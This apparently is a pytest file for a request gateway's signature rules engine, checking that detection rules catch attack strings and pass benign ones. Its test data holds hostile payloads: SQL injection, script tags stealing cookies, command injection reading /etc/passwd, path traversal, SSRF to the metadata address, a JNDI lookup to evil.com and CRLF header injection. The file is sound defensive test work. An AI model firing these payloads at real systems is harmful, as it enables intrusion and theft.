"""
Signature Rules Engine Tests (Module M3).
Verifies rule loading from config/rules.yaml, category coverage (positive and benign cases),
benign corpus verification (zero false positives), and rule hot-reloading/toggling.
"""

from __future__ import annotations

from pathlib import Path
import urllib.parse

import yaml

from gateway.models import RequestContext
from gateway.normalizer import Variant, build_targets
from gateway.rules import RuleManager, get_rule_manager


def test_loads_all_sixteen_rules():
    """Verify that all 16 rules in config/rules.yaml are loaded and precompiled."""
    manager = RuleManager("config/rules.yaml")
    rules = manager.get_rules()
    assert len(rules) == 16
    for r in rules:
        assert r.compiled is not None
        assert len(r.targets) > 0
        assert r.score in (2, 3, 4, 5)


def test_rule_categories_positive_and_benign():
    """
    Test positive and benign cases for every rule category:
    sqli, nosql, xss, cmdi, traversal, ssrf, jndi, bot, protocol.
    """
    manager = RuleManager("config/rules.yaml")

    def match_text(target: str, text: str) -> list[str]:
        variants = {target: [Variant(text=text, chain=["raw"])]}
        findings = manager.match(variants)
        return [f.category for f in findings]

    # 1. SQL Injection (sqli)
    assert "sqli" in match_text("query", "1' UNION ALL SELECT 1,2,3--")
    assert "sqli" in match_text("body", "admin' OR 1=1--")
    assert "sqli" in match_text("body", "; DROP TABLE users;")
    # Benign SQLi
    assert "sqli" not in match_text("query", "Western Union Transfer")
    assert "sqli" not in match_text("query", "Please select a plan")

    # 2. NoSQL Injection (nosql)
    assert "nosql" in match_text("body", "$ne")
    assert "nosql" in match_text("body", "$gt")
    # Benign NoSQL
    assert "nosql" not in match_text("body", "Price is $50")
    assert "nosql" not in match_text("body", "Earn $$$ fast")

    # 3. Cross-Site Scripting (xss)
    assert "xss" in match_text("body", "<script>alert(1)</script>")
    assert "xss" in match_text("headers", "javascript:alert(document.cookie)")
    # Benign XSS
    assert "xss" not in match_text("body", "Comparison: 5 < 10 and 10 > 5")
    assert "xss" not in match_text("body", "Check out the script writing guide")

    # 4. OS Command Injection (cmdi)
    assert "cmdi" in match_text("query", "; cat /etc/passwd")
    assert "cmdi" in match_text("body", "&& whoami")
    assert "cmdi" in match_text("headers", "$(id)")
    # Benign CMDI
    assert "cmdi" not in match_text("query", "cat food and dog food")
    assert "cmdi" not in match_text("body", "Please send your id card")

    # 5. Path Traversal (traversal)
    assert "traversal" in match_text("path", "/api/../../etc/passwd")
    assert "traversal" in match_text("query", "..\\..\\windows\\system32")
    # Benign Traversal
    assert "traversal" not in match_text("path", "/api/products/details")
    assert "traversal" not in match_text("query", "file.pdf")

    # 6. SSRF (ssrf)
    assert "ssrf" in match_text("query", "http://169.254.169.254/latest/meta-data/")
    assert "ssrf" in match_text("body", "http://127.0.0.1:9000/admin")
    # Benign SSRF
    assert "ssrf" not in match_text("query", "https://example.com/api")
    assert "ssrf" not in match_text("body", "https://github.com/fastapi/fastapi")

    # 7. Log4Shell / JNDI (jndi)
    assert "jndi" in match_text("headers", "${jndi:ldap://evil.com/x}")
    assert "jndi" in match_text("ua", "${jndi:rmi://10.0.0.1/obj}")
    # Benign JNDI
    assert "jndi" not in match_text("headers", "${regular_variable}")
    assert "jndi" not in match_text("body", "Template string: ${user.name}")

    # 8. Bot Signals (bot)
    assert "bot" in match_text("ua", "sqlmap/1.5.2#stable")
    assert "bot" in match_text("ua", "Mozilla/5.0 Nikto 2.1.6")
    # Benign Bot
    assert "bot" not in match_text("ua", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0")
    assert "bot" not in match_text("ua", "curl/7.88.1")

    # 9. Protocol Splitting (protocol)
    assert "protocol" in match_text("query", "%0d%0aSet-Cookie: evil=1")
    assert "protocol" in match_text("headers", "\\r\\nInjected-Header: 123")
    # Benign Protocol
    assert "protocol" not in match_text("query", "order%20status")
    assert "protocol" not in match_text("headers", "Custom-Header: normal-value")


def test_evasion_variants_match():
    """Verify that multi-decode evasion variants produce rule matches."""
    manager = RuleManager("config/rules.yaml")

    # Double URL-encoded union select
    double_encoded = "%2527%2520UNION%2520SELECT"
    ctx1 = RequestContext(
        incident_id="AG-1",
        client_ip="1.2.3.4",
        method="GET",
        path="/api/products",
        query_string=f"search={double_encoded}",
        query_params={"search": [double_encoded]},
    )
    targets1 = build_targets(ctx1)
    findings1 = manager.match(targets1)
    assert any(f.rule_id == "SQLI-001" for f in findings1)

    # HTML entity-encoded script tag
    html_encoded = "&lt;script&gt;alert(1)&lt;/script&gt;"
    ctx2 = RequestContext(
        incident_id="AG-2",
        client_ip="1.2.3.4",
        method="POST",
        path="/api/feedback",
        body_text=f'{{"comment": "{html_encoded}"}}',
        content_type="application/json",
    )
    targets2 = build_targets(ctx2)
    findings2 = manager.match(targets2)
    assert any(f.rule_id == "XSS-001" for f in findings2)

    # SQL inline-comment splitting
    comment_split = "UNION/**/ALL/**/SELECT"
    ctx3 = RequestContext(
        incident_id="AG-3",
        client_ip="1.2.3.4",
        method="GET",
        path="/api/products",
        query_string=f"category={comment_split}",
        query_params={"category": [comment_split]},
    )
    targets3 = build_targets(ctx3)
    findings3 = manager.match(targets3)
    assert any(f.rule_id == "SQLI-001" for f in findings3)


def test_benign_corpus_produces_zero_hits():
    """Load tests/corpus/benign.yaml and verify zero rules match any benign sample."""
    manager = RuleManager("config/rules.yaml")
    corpus_path = Path("tests/corpus/benign.yaml")
    assert corpus_path.is_file(), "tests/corpus/benign.yaml must exist"

    with open(corpus_path, "r", encoding="utf-8") as f:
        samples = yaml.safe_load(f) or []

    assert len(samples) > 0

    for sample in samples:
        raw_q = sample.get("query")
        if isinstance(raw_q, dict):
            q_params = {k: [str(v)] for k, v in raw_q.items()}
            q_str = "&".join(f"{k}={v}" for k, v in raw_q.items())
        elif isinstance(raw_q, str):
            q_str = raw_q
            q_params = urllib.parse.parse_qs(raw_q, keep_blank_values=True)
        else:
            q_str = ""
            q_params = {}

        ctx = RequestContext(
            incident_id=f"AG-BENIGN-{sample.get('id')}",
            client_ip="127.0.0.1",
            method=sample.get("method", "GET"),
            path=sample.get("path", "/api/products"),
            query_string=q_str,
            query_params=q_params,
            headers=sample.get("headers", {}),
            user_agent=sample.get("headers", {}).get("user-agent", "Mozilla/5.0"),
            body_text=sample.get("body") or "",
            content_type=sample.get("headers", {}).get("content-type", "application/json"),
        )
        targets = build_targets(ctx)
        findings = manager.match(targets)
        assert len(findings) == 0, (
            f"False positive on {sample.get('id')} ({sample.get('description')}): "
            f"matched {[f.rule_id for f in findings]}"
        )


def test_rule_toggle_and_reload():
    """Verify that rules can be dynamically disabled/enabled and reloaded."""
    manager = RuleManager("config/rules.yaml")
    sqli_rule = manager.get_rule("SQLI-001")
    assert sqli_rule is not None
    assert sqli_rule.enabled is True

    # Disable SQLI-001
    manager.set_rule_enabled("SQLI-001", False)
    assert manager.get_rule("SQLI-001").enabled is False

    variants = {"query": [Variant(text="UNION SELECT 1,2", chain=["raw"])]}
    findings = manager.match(variants)
    assert not any(f.rule_id == "SQLI-001" for f in findings)

    # Re-enable SQLI-001
    manager.set_rule_enabled("SQLI-001", True)
    findings = manager.match(variants)
    assert any(f.rule_id == "SQLI-001" for f in findings)

    # Hot reload restores file defaults
    count = manager.reload()
    assert count == 16
    assert manager.get_rule("SQLI-001").enabled is True
